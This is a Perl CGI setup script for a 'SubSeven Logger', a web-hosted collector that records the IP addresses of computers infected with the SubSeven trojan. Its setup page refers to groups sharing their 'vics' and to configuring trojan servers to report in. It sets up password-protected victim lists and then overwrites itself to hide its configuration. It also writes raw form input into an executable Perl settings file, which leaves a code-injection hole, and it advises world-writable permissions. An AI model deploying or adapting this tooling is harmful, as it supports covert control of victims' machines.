#! /usr/bin/perl -w

### ^ path to perl on your server (should be correct)
###   If your wrong, you will get a 500 error.

###################################################################
#                     +SUBSEVEN LOGGER+                           #
###################################################################
#                                                                 #
# SubSeven is provided 'as-is', without any express or implied    #
# warranty. in no event will the author be held liable for any    #
# damages arising from the use of it.                             #
#                                                                 #
# The author can't be held responsible for any illegal action(s)  #
# arising from the use of this software. Sub7 is provided for     #
# educational purposes only!                                      #
#                                                                 #
#                 SUBSEVEN CAN BE FOUND AT                        #
#                    www.sub7page.com                             #
#                                                                 #
###################################################################
# There is nothing in this file you need to edit, in fact you     #
# may cause harm just by changing a few letters.  If however      #
# the first line of this program is not the path to perl on       #
# your server, you need to change that.  But that is all, no      #
# more.  Please Read the README.txt that you receved with this    #
# file.  all questions will be reviewed there.                    #
#                                                                 #
# There is no way to modify this script so that it will retreave  #
# information that it already does not.                           #
###################################################################
#                                                                 #
#               - ABOUT CGI SUBSEVEN LOGGER -                     #
#                                                                 #
#   Programmer:   Black-Fire                                      #
#   Website:      http://www.black-fire.net                       #
#   ICQ:          64782400                                        #
#   E-mail        sublogger@black-fire.net                        #
#   IRC:          irc.chatech.net  #bfn                           #     
#                                                                 #
###################################################################
#                                                                 #
#  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  #
#  M""""""'YMMMMMP"""""YMMMMMMM"""""""`YMMMMP"""""YMMMM""""""""M  #
#  M  mmmm. `MMM' .mmm. `MMMMMM  mmmm.  MMM' .mmm. `MMMmmm  mmmM  #
#  M  MMMMM  MMM  MMMMM  MMMMMM  MMMMM  MMM  MMMMM  MMMMMM  MMMM  #
#  M  MMMMM  MMM  MMMMM  MMMMMM  MMMMM  MMM  MMMMM  MMMMMM  MMMM  #
#  M  MMMM' .MMM. `MMM' .MMMMMM  MMMMM  MMM. `MMM' .MMMMMM  MMMM  #
#  M_______.MMMMMb_____dMMMMMMM__MMMMM__MMMMb_____dMMMMMMM__MMMM  #
#  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  #
#  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  #
#  MMMMMMMMMM""""""""`MMM""""""'YMMMM""MMM""""""""MMMMMMMMMMMMMM  #
#  MMMMMMMMMM  mmmmmmmMMM  mmmm. `MMM  MMMmmm  mmmMMMMMMMMMMMMMM  #
#  MMMMMMMMMM       MMMMM  MMMMM  MMM  MMMMMM  MMMMMMMMMMMMMMMMM  #
#  MMMMMMMMMM  MMMMMMMMMM  MMMMM  MMM  MMMMMM  MMMMMMMMMMMMMMMMM  #
#  MMMMMMMMMM  MMMMMMMMMM  MMMM' .MMM  MMMMMM  MMMMMMMMMMMMMMMMM  #
#  MMMMMMMMMM________.MMM_______.MMMM__MMMMMM__MMMMMMMMMMMMMMMMM  #
#  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  #
#  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  #                                     
#                                                                 #
###################################################################


print "Content-type: text/html\n\n";
$script = $ENV{'SCRIPT_NAME'};
read(STDIN, $bufferb, $ENV{'CONTENT_LENGTH'});
@pairsb = split(/&/, $bufferb);
foreach $pairb (@pairsb) {  ($nameb, $valueb) = split(/=/, $pairb);
  $valueb =~ tr/+/ /;
  $valueb =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $valueb =~ s/~!/ ~!/g;  $SUBIN{$nameb} = $valueb;}


	@days   = ('Sunday','Monday','Tuesday','Wednesday',
               'Thursday','Friday','Saturday');
($sec,$min,$hour,$mday,$mon,$year,$wday) = (localtime(time))[0,1,2,3,4,5,6];

$time = sprintf("%02d:%02d:%02d",$hour,$min,$sec);
$date = "$days[$wday] $mday, $time";
print "<div align = \"right\">Servers Time: $date</div><br>\n";

########## MAKE FILES #############
open(FILE, ">>subseven.set");
close(FILE);
open(FILE, ">>subseven.mem");
close(FILE);
open(FILE, ">>subseven.log");
close(FILE);
open(FILE, ">>subseven.ban");
close(FILE);
open(FILE, ">>subseven.adr");
close(FILE);

########## GET VARS #############
$error = "false";
$opper = $SUBIN{'page'};

########## PRINT INSTRUCTIONS ##############
print "<html>\n";
print "<script language = \"javascript\">\n/*\n<!--#echo banner=\"\"-->\n*/\n</script>\n";
print "<body bgcolor = \"black\" text = \"limegreen\">\n";
print "<font face = \"OCR A extended\">\n";
print "<center><table width = 650 border = 1 cellpadding = 0 cellspacing = 0 bordercolor = \"gray\"><td><font face = \"OCR A extended\">\n";

if ($opper eq "") {
print "<font face = \"OCR A extended\"><center><h1>SETUP PROGRAM</h1><p>\n";
print "please answer all of the following question.  At the end, press the install button.  When all this information is recorded, you will be given optional security instruction.<p>\n";
print "<form action = \"$script\" method = \"post\">\n";
print "<input type = \"hidden\" name = \"page\" value = \"2\">\n";
print "When you run the main list program, do you want to require a password.  If you do this, only people who know the password can view the list. RECOMENDED<br>\n";
print "<input type = \"radio\" name = \"reqp\" value = \"true\" CHECKED>Require password<br><input type = \"radio\" name = \"reqp\" value = \"false\">Do not require password<p>\n";
print "If you are requiring a password to view the list, you can support multi users.  There are special features that allow you to add users and delete user and allow them to sign up automaticaly.  This is good for small groups that wish to share there vics.<br>\n";
print "<input type = \"radio\" name = \"smul\" value = \"true\" CHECKED>Support multi users<br><input type = \"radio\" name = \"smul\" value = \"false\">Do not support multi users<p>\n";
print "To prevent your list from becomming to large. This program can automaticaly remove logged ips periodicaly.  please select how often you would like this to happen.<br>\n";
print "<input type = \"radio\" name = \"dent\" value = \"2\" CHECKED>delete after 2 days<br><input type = \"radio\" name = \"dent\" value = \"3\">delete after 3 days<br><input type = \"radio\" name = \"dent\" value = \"4\">delete after 4 days<br><input type = \"radio\" name = \"dent\" value = \"5\">delete after 5 days<br><input type = \"radio\" name = \"dent\" value = \"6\">delete after 6 days<br><input type = \"radio\" name = \"dent\" value = \"7\">delete after 7 days<p>\n";
print "If this version supports graphics, this option will add images to make the program look better.  If the version does not support this, this option will do nothing.<br>\n";
print "<input type = \"radio\" name = \"imgs\" value = \"true\" CHECKED>Display images<br><input type = \"radio\" name = \"imgs\" value = \"false\">Do not display images<p>\n";
print "Require subseven to use a password to log new information. <br>\n";
print "<input type = \"radio\" name = \"reqsp\" value = \"true\" CHECKED>Require subseven password<br><input type = \"radio\" name = \"reqsp\" value = \"false\">Do not require subseven password<p>\n";
print "If you require subseven to have a password, you must specify a 5 number code.  When using EditServer you will be provided a space to enter this code.  This will ensure that no one else tells there servers to log ips with your program. RECOMENDED<br>\n";
print "<input type = \"text\" name = \"sp\" size = 6 maxlength = 5 value = \"00000\"><p>\n";
print "So you can access this setup program again and the admin menu, you will need to enter a master password and username.  Do not tell anyone else what these are.  You will be the only user who can clear the list of IP's and add members (if multi member support is on).<br>\n";
print "Username: <input type = \"text\" name = \"auser\" size = 23><br>\n";
print "Password: <input type = \"password\" name = \"apass1\" size = 23><br>\n";
print "Password: <input type = \"password\" name = \"apass2\" size = 23> (re enter pass)<p>\n";
print "what do you want the html title tags to say.  this is what appears on the blue bar at the top of the browser.<br>\n";
print "<input type = \"text\" name = \"title\" size = 23 value = \"SubSeven IP Logger\"><p>\n";
print "What color do you want the documents background to be.<br>\n";
print "<input type = \"text\" name = \"bgcolor\" size = 23 value = \"black\"><p>\n";
print "What color do you want the documents text to be.<br>\n";
print "<input type = \"text\" name = \"txcolor\" size = 23 value = \"limegreen\"><p>\n";
print "What do you want the documents font to be.<br>\n";
print "<input type = \"text\" name = \"txfont\" size = 23 value = \"OCR A extended\"><p>\n";
print "What color do you want the table backgrounds to be.<br>\n";
print "<input type = \"text\" name = \"tbcolor\" size = 23 value = \"black\"><p>\n";
print "What size do you want all text to be, (<font size = 1>1</font>, <font size = 2>2, </font><font size = 3>3, </font><font size = 4>4, </font><font size = 5>5</font>)<br>\n";
print "<input type = \"text\" name = \"txsize\" size = 23 value = \"red\"><p>\n";
print "What color do you want the documents links to be.<br>\n";
print "<input type = \"text\" name = \"links\" size = 23 value = \"red\"><p>\n";
print "What color do you want the documents borders to be.<br>\n";
print "<input type = \"text\" name = \"tboard\" size = 23 value = \"blue\"><p>\n";
print "remember, you can always change these settings in the admin menu.  go back and make sure the colors you gave, where spelled correctly and that you filled every thing out.<p>\n";
print "<input type = \"submit\" value = \"INSTALL PROGRAM\">\n";
print "</table>\n";
}


if ($opper eq "2") {
$rpass = $SUBIN{'reqp'};
$smul = $SUBIN{'smul'};
$dispad = "false";
$imgt = $SUBIN{'imgs'}; 
$rs7pass = $SUBIN{'reqsp'}; 
$fkey = $SUBIN{'sp'}; 
$nuser = $SUBIN{'auser'}; 
$npass = $SUBIN{'apass1'}; 
$npass2 = $SUBIN{'apass2'}; 
$dtitle = $SUBIN{'title'}; 
$bgcolor = $SUBIN{'bgcolor'}; 
$txcolor = $SUBIN{'txcolor'};
$txfont = $SUBIN{'txfont'};  
$txsize = $SUBIN{'txsize'};  
$tbcolor = $SUBIN{'tbcolor'}; 
$lncolor = $SUBIN{'links'}; 
$tboard = $SUBIN{'tboard'};
$dent = $SUBIN{'dent'};

if ($rpass eq "" or $smul eq "" or $dispad eq "" or $imgt eq "" or $rs7pass eq "" or $fkey eq "" or $nuser eq "" or $npass eq "" or $npass2 eq "" or $dtitle eq "" or $bgcolor eq "" or $txcolor eq "" or $txfont eq "" or $tbcolor eq "" or $lncolor eq "" or $tboard eq "" or $dent eq "") {
$errortext = "You are missing required information.  Please go back and and fill out everying.";
&derror;
}
else {
if ($npass eq $npass2) {
open(FILE, ">subseven.set");
print FILE "\$Xauth = \"$rpass\";\n";
print FILE "\$Xmulti = \"$smul\";\n";
print FILE "\$Xbgcolor = \"$bgcolor\";\n";
print FILE "\$Xtext = \"$txcolor\";\n";
print FILE "\$Xfont = \"$txfont\";\n";
print FILE "\$Xlinks = \"$lncolor\";\n";
print FILE "\$Xads = \"false\";\n";
print FILE "\$Xborders = \"$tboard\";\n";
print FILE "\$Xtables = \"$tbcolor\";\n";
print FILE "\$Xsubpass = \"$rs7pass\";\n";
print FILE "\$Xkey = \"$fkey\";\n";
print FILE "\$Xrequser = \"$nuser\";\n";
print FILE "\$Xreqpass = \"$npass\";\n";
print FILE "\$Ximages = \"$imgt\";\n";
print FILE "\$Xtitle = \"$dtitle\";\n";
print FILE "\$Xdent = \"$dent\";\n";
print FILE "\$Xsize = \"$txsize\";\n";
close(FILE);
print "<font face = \"OCR A extended\"><center><h1>SETUP PROGRAM</h1><p><font face = \"OCR A extended\">\n";
print "All settings have been recorded in the proper files.  If you set a password or think you may ever do so, then please follow these instructions.<p>\n";
print "First, you should set the file premission to a few files.<br>\n";
print "To set the file premission, you can use an option called CHMODE.  If your using an ftp program, such as CuteFTP, you can set the chmode by right clicking on a file that has been uploaded already.  when the menu comes up, select CHMODE.  Then set the correct chmode for each file as listed below.  If you are not using an FTP program, you must get one, as you cant upload in ascii.<p>\n";
print "These files where created for you automaticaly by this program.<br>\n";
print "CHMODE SETTINGS:<br>\n";
print "</center>subseven.log : 600 or -rw------- <br>\n";
print "subseven.mem : 600 or -rw------- <br>\n";
print "subseven.set : 600 or -rw------- <br>\n";
print "subseven.ban : 600 or -rw------- <br>\n";
print "subseven.adr : 600 or -rw------- <br>\n";
print "subseven.cgi : 755 or -rwxr-xr-x <p>\n";
print "If these settings do not work, and you receve a 500 error, chmod the files to:<br>\n";
print "</center>subseven.log : 777 or -rwxrwxrwx <br>\n";
print "subseven.mem : 777 or -rwxrwxrwx <br>\n";
print "subseven.set : 777 or -rwxrwxrwx <br>\n";
print "subseven.ban : 777 or -rwxrwxrwx <br>\n";
print "subseven.adr : 777 or -rw------- <br>\n";
print "subseven.cgi : 755 or -rwxr-xr-x <p>\n";
print "<center>this is not mandantory, however it will prevent people who have knowlege of this program from finding your admin password.  also if you wish to customize the error people will get when they try to access restricted files, do the following.<p>\n";
print "1) create a file named \".htaccess\" it must be named that or it will not work.  if you cant name it that in windows, you can rename it once you upload it.<br>\n";
print "2) add the following lines to the file \".htaccess\"<br>\n";
print "</center>ErrorDocument 401 \"what ever html you want displayed<br>\n";
print "ErrorDocument 404 \"What ever you want your 404 errors to say<p>\n";
print "<center>thats it.  That would also be the way to change what you see at any error.<p>\n";
print "Well thats it, your done. now you can have subseven add IP's to your list.<br>\n";
print "<p>your finished, so you can check out the script. here is a link to it.<br><center><a href = \"subseven.cgi\">View the script</a></center><p>\n";

open(FILE, "setup.cgi");
$perl = <FILE>;
close(FILE);
open(FILE, ">setup.cgi");
print FILE "$perl\n";
print FILE "print \"Content-type: text/html\\n\\n\";\n";
print FILE "print \"Script destroyed, you must reinstall this script!<p>This is done so that no one can edit your information without the admin pass. it is not recommended that you leave an active copy of this program on your server.  This copy is no longer active and no longer contains the source to edit any configuration files.  You can delete this file safly at any time.\";\n";

close(FILE);

}
else {
$errortext = "your passwords did not match. Please go back and correct the problem.";
&derror;

}
}

}


sub derror {
if ($error eq "false") {
print "<center><table width = 450 border = 1 cellpadding = 3 cellspacing = 0 bgcolor = \"black\" bordercolor = \"gray\">\n";
print "<td><b><center><font face = \"areal\">USER ERROR</font></center></b></td><tr><td>\n";
print "<b><br><font face = \"OCR A extended\">$errortext\n";
print "</td></table>\n";
$error = "true";
}
};

print "</table></table></body></html>\n";